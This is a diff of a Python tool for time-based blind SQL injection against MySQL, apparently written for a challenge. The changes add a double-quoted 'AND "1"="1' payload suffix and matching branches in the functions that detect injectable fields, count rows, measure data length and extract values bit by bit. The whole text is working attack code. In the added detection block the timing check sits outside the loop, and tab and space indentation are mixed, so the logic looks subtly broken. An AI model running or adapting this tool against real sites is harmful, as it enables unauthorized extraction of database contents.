@@ -15,14 +15,15 @@ M_POST = 'POST'
 EVALUATING_ROUNDS = 10 # Numero di esecuzioni per determinare il tempo di risposta del server
 threads_num = 1
 
-SQL_SUFFIX_TYPE = ['', '-- -', 'AND \'1\'=\'1']
+SQL_SUFFIX_TYPE = ['', '-- -', 'AND \'1\'=\'1', "AND \"1\"=\"1"]
 NO_SUFF = 0
 COMMENT_SUFF = 1
 AND_SUFF = 2
+AND_SUFF_2 = 3
 
 verbose = 0
 log = 0
-LOG_FILE_NAME = 'challenge2.md'
+LOG_FILE_NAME = 'time_based.log'
 
 # MySQL DB Tables #
 INFORMATION_SCHEMA_DB_NAME = 'information_schema'
@@ -195,6 +196,17 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
         return vuln_fields
 
     for field in m_data:
+        m_data[field] = data[field] + sql.format('\"', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF_2])
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
+    if elapsed >= sleep_time:
+        vuln_fields.update({field:AND_SUFF_2})
+    for field in vuln_fields:
+        m_data.pop(field)
+
+    if len(m_data) == 0:
+        return vuln_fields
+
+    for field in m_data:
         m_data[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
         elapsed = measure_request_time(url, method, headers, cookies, m_data)
     if elapsed >= sleep_time:
@@ -220,8 +232,10 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field, vuln_
             query += ' WHERE {}=\'{}\''.format(where_param, where_value)
         if vuln_type == COMMENT_SUFF:
             sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
-        else:
+        elif vuln_type == AND_SUFF:
             sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
+        else:
+        	sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF_2]
     else:
         if where_param:
             query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))
@@ -272,8 +286,10 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
             query += ' WHERE {}=\'{}\''.format(where_param, where_value)
         if vuln_type == COMMENT_SUFF:
             sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
-        else:
+        elif vuln_type == AND_SUFF:
             sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
+        else:
+        	sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF_2]
     else:
         if where_param:
             query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))
@@ -328,8 +344,10 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field, vuln_t
             query += ' WHERE {}=\'{}\''.format(where_param, where_value)
         if vuln_type == COMMENT_SUFF:
             sql_inj += ' ' + SQL_SUFFIX_TYPE[COMMENT_SUFF]
-        else:
+        elif vuln_type == AND_SUFF:
             sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF]
+        else:
+        	sql_inj += ' ' + SQL_SUFFIX_TYPE[AND_SUFF_2]
     else:
         if where_param:
             query += ' WHERE {}=CHAR({})'.format(where_param, string_to_int_list(where_value))
